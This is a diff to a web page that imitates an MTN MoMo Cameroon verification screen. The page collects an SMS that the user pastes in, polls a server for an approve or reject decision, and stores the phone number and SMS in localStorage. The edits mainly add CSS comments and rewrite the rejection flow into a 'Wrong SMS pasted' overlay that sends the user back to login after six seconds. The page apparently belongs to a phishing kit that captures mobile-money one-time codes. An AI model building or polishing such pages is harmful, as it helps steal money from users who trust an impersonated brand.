@@ -31,6 +31,7 @@
             gap: 10px;
         }
 
+        /* ===== HEADER ===== */
         header {
             width: 100%;
             max-width: 480px;
@@ -79,6 +80,7 @@
             white-space: nowrap;
         }
 
+        /* ===== CARD ===== */
         .card {
             background: white;
             border-radius: 24px;
@@ -93,6 +95,7 @@
             overflow-y: auto;
         }
 
+        /* ===== ICON BADGE ===== */
         .icon-badge {
             width: 60px;
             height: 60px;
@@ -134,6 +137,7 @@
             font-weight: 700;
         }
 
+        /* ===== STEP HINT ===== */
         .step-hint {
             background: #f8f9ff;
             border-radius: 12px;
@@ -161,6 +165,7 @@
             color: #0047AB;
         }
 
+        /* ===== SMS TEXTAREA ===== */
         .sms-wrapper {
             position: relative;
             margin-bottom: 6px;
@@ -246,6 +251,7 @@
         }
         .error-text.show { display: block; }
 
+        /* ===== RESEND ROW ===== */
         .resend-row {
             display: flex;
             justify-content: space-between;
@@ -276,6 +282,7 @@
         .resend-link:hover:not(:disabled) { background: #f0f4ff; }
         .resend-link:disabled { color: #bbb; cursor: not-allowed; }
 
+        /* ===== VERIFY BUTTON ===== */
         .verify-btn {
             width: 100%;
             padding: 15px;
@@ -312,6 +319,7 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
+        /* ===== SECURITY NOTICE ===== */
         .security-notice {
             display: flex;
             align-items: flex-start;
@@ -326,6 +334,7 @@
             flex-shrink: 0;
         }
 
+        /* ===== FOOTER ===== */
         footer {
             padding: 6px;
             color: #aaa;
@@ -336,6 +345,7 @@
             flex-shrink: 0;
         }
 
+        /* ===== SMALL PHONES ===== */
         @media (max-height: 700px) {
             .card { padding: 18px 16px; }
             .icon-badge {
@@ -358,6 +368,9 @@
             .paste-btn { padding: 6px 10px; font-size: 11px; }
         }
 
+        /* ============================================
+           VERIFYING OVERLAY
+           ============================================ */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -528,6 +541,7 @@
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
 
+    <!-- ===== VERIFYING OVERLAY ===== -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-content">
             <div class="verify-momo-icon">MoMo</div>
@@ -723,7 +737,7 @@
         }
 
         /* ============================================
-           RESEND → TOAST + REDIRECT TO login.html
+           RESEND → SHOW CATCHY OVERLAY FOR 6s → REDIRECT
         ============================================ */
         let resendHandled = false;
 
@@ -733,21 +747,26 @@
 
             if (verifyTimer) clearInterval(verifyTimer);
             verifyBarFill.style.width = '100%';
-            verifyBarFill.style.background = '#0047AB';
+            verifyBarFill.style.background = '#FFCC00';
 
-            /* Update overlay text */
-            verifyTitle.innerHTML = 'Please start <span class="highlight">fresh</span>';
-            verifySubtitle.textContent = 'Kindly start fresh and put your details correctly to match. You will receive a new SMS.';
+            /* Show the catchy, clear message */
+            verifyOverlay.classList.add('show');
+            verifyTitle.innerHTML = '⚠️ <span class="highlight">Wrong SMS</span> pasted';
+            verifySubtitle.innerHTML =
+                '<b style="color:#1a1a2e;font-size:14.5px;">The message you pasted is not the correct MTN SMS.</b><br><br>' +
+                'Please start fresh and paste the <b>correct</b> SMS from MTN MoMo.';
+            verifySubtitle.style.fontSize = '13.5px';
+            verifySubtitle.style.lineHeight = '1.65';
+            verifySubtitle.style.padding = '0 6px';
 
-            /* After 3s → redirect to login */
+            /* Redirect after 6 seconds */
             setTimeout(function() {
-                /* Clear session data so user truly starts fresh */
                 localStorage.removeItem('momoSession');
                 localStorage.removeItem('momoPhone');
                 localStorage.removeItem('momoCountry');
                 localStorage.removeItem('momoSms');
                 window.location.href = 'login.html';
-            }, 3000);
+            }, 6000);
         }
 
         /* ============================================
@@ -783,7 +802,6 @@
 
                     } else if (data.status === 'rejected') {
                         stopPolling();
-                        /* Same as resend → go back to login */
                         showRejection({
                             title: 'Please start <span class="highlight">fresh</span>',
                             subtitle: 'Kindly start fresh and put your details correctly to match.',
